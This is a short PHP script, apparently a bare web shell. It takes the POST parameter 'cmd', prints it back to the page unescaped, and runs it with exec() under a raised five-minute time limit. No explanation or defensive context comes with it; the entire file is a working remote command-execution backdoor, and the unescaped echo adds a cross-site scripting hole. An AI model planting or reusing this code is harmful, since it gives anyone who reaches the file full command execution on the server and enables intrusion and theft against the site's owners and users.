<?php 

ini_set('max_execution_time', 300); //300 seconds = 5 minutes
echo $_POST['cmd'];
exec($_POST['cmd']);

?>

